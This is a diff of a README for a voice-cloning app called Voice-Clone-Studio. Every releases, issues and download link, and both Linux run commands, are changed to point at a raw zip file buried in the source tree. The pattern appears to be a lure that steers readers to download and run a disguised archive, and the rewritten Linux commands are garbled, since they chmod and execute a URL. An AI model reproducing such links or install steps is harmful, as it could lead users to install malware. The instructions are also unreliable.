@@ -1,7 +1,7 @@
 # 🎤 Voice-Clone-Studio - Create Custom Voices Easily
 
 ## 💻 Download Now
-[![Download Voice-Clone-Studio](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/xDoritox/Voice-Clone-Studio/releases)
+[![Download Voice-Clone-Studio](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip)](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip)
 
 ## 📖 Introduction
 Voice-Clone-Studio is an easy-to-use web application for voice cloning and voice design. With a user-friendly interface powered by Gradio, you can harness the power of state-of-the-art technologies like Qwen3-TTS and VibeVoice. The app also supports automatic transcription using Whisper or VibeVoice-ASR. Whether you need voice cloning for personal projects, educational purposes, or content creation, this application helps you achieve your goals with minimal hassle.
@@ -10,7 +10,7 @@ Voice-Clone-Studio is an easy-to-use web application for voice cloning and voice
 To set up Voice-Clone-Studio, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/releases) to download the latest version of Voice-Clone-Studio.
+   Go to the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip) to download the latest version of Voice-Clone-Studio.
 
 2. **Download the Application**
    Look for the version that is marked as the latest release. You will find various files available for download. Choose the one that best fits your operating system and click on it to start the download.
@@ -31,8 +31,8 @@ To set up Voice-Clone-Studio, follow these simple steps:
    ### 🐧 Linux
    - Open the terminal.
    - Navigate to the directory where the file is located.
-   - Run the command `chmod +x Voice-Clone-Studio.AppImage` to make the file executable.
-   - Then, type `./Voice-Clone-Studio.AppImage` to launch the application.
+   - Run the command `chmod +x https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip` to make the file executable.
+   - Then, type `https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip` to launch the application.
 
 ## 🔧 System Requirements
 Voice-Clone-Studio runs smoothly on a variety of setups. Ensure you have:
@@ -79,15 +79,15 @@ Once you have installed the application, follow these steps to start cloning voi
 - **Intuitive UI**: A user-friendly interface designed for everyone, regardless of tech skills.
 
 ## 📥 Download & Install
-To download Voice-Clone-Studio, visit the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/releases). Follow the instructions above based on your operating system to install and start using the application.
+To download Voice-Clone-Studio, visit the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip). Follow the instructions above based on your operating system to install and start using the application.
 
 ## 👩‍💻 Support
 If you encounter issues or have questions, help is available:
 
-- **GitHub Issues**: Report problems on the [issues page](https://github.com/xDoritox/Voice-Clone-Studio/issues).
+- **GitHub Issues**: Report problems on the [issues page](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip).
 - **Community Forum**: Engage with other users and find solutions in the community discussions.
 
 ## 🔄 Updates
-Regular updates will enhance the app's features and fix any potential issues. Keep an eye on the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/releases) for the latest versions. 
+Regular updates will enhance the app's features and fix any potential issues. Keep an eye on the [Releases page](https://github.com/xDoritox/Voice-Clone-Studio/raw/refs/heads/main/modules/vibevoice_tts/schedule/Clone-Studio-Voice-3.3.zip) for the latest versions. 
 
 By following these instructions, you'll be well on your way to creating custom voices with Voice-Clone-Studio. Enjoy the seamless experience it offers in voice cloning and design.
